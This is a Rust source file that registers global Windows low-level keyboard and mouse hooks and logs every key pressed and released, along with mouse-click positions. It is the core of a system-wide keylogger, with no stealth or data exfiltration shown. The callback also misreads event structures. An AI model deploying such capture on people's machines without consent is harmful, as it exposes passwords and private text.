use std::ptr::null_mut;
use windows_sys::Win32::{
    Foundation::{LPARAM, LRESULT, WPARAM},
    UI::WindowsAndMessaging::{
        CallNextHookEx, DispatchMessageA, GetMessageA, SetWindowsHookExA, TranslateMessage, UnhookWindowsHookEx, HHOOK, KBDLLHOOKSTRUCT, MSLLHOOKSTRUCT, WH_KEYBOARD_LL, WH_MOUSE_LL, WM_KEYDOWN, WM_KEYUP, WM_LBUTTONDOWN, WM_RBUTTONDOWN, WM_SYSKEYDOWN, WM_SYSKEYUP
    }
};

use super::keys::KEYS_MAP;

///hook handle
static mut HOOK: HHOOK = null_mut();
static mut MOUSE_HOOK: HHOOK = null_mut();
///handle callback
unsafe extern "system" fn hook_callback(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT
{
    if n_code >= 0
    {
        let kb_struct = *(l_param as *const KBDLLHOOKSTRUCT);
        let mouse_struct = *(l_param as *const MSLLHOOKSTRUCT);
        match w_param as u32
        {
            WM_KEYDOWN | WM_SYSKEYDOWN => 
            {
                let key = KEYS_MAP.get_key(kb_struct.vkCode);
                if let Ok(k) = key
                {
                    logger::info!("pressed => {}", k);
                }
                else 
                {
                    logger::error!("{}", key.err().unwrap());    
                }
            },
            WM_KEYUP | WM_SYSKEYUP => 
            {
                let key = KEYS_MAP.get_key(kb_struct.vkCode);
                if let Ok(k) = key
                {
                    logger::info!("unpressed => {}", k);
                }
                else 
                {
                    logger::error!("{}", key.err().unwrap());    
                }
            },
            WM_LBUTTONDOWN => 
            {
                logger::info!("mouse left click at ({}, {})", mouse_struct.pt.x, mouse_struct.pt.y);
            },
            WM_RBUTTONDOWN => 
            {
                logger::info!("mouse right click at ({}, {})", mouse_struct.pt.x, mouse_struct.pt.y);
            }
            _ => ()
        }
    }
    CallNextHookEx(HOOK, n_code, w_param, l_param)
}

pub fn start() 
{
    unsafe 
    {
        HOOK = SetWindowsHookExA(WH_KEYBOARD_LL, Some(hook_callback), null_mut(), 0);
        if HOOK.is_null()
        {
            logger::error!("error register keyboard hook");
            return;
        }
        MOUSE_HOOK = SetWindowsHookExA(WH_MOUSE_LL, Some(hook_callback), null_mut(), 0);
        if MOUSE_HOOK.is_null()
        {
            logger::error!("error register mouse hook");
            return;
        }
        let mut msg = std::mem::zeroed();
        //for process alive
        while GetMessageA(&mut msg, null_mut(), 0, 0) > 0
        {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
        UnhookWindowsHookEx(HOOK);
        UnhookWindowsHookEx(MOUSE_HOOK);
    }
}
